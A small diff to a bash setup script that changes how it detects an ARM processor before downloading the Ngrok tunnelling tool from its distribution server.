@@ -215,7 +215,7 @@ echo ""
 else
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(arch | grep 'arm')
+arch=$(uname -a | grep -o 'arm')
 
 if [[ $arch == *'arm'* ]]; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
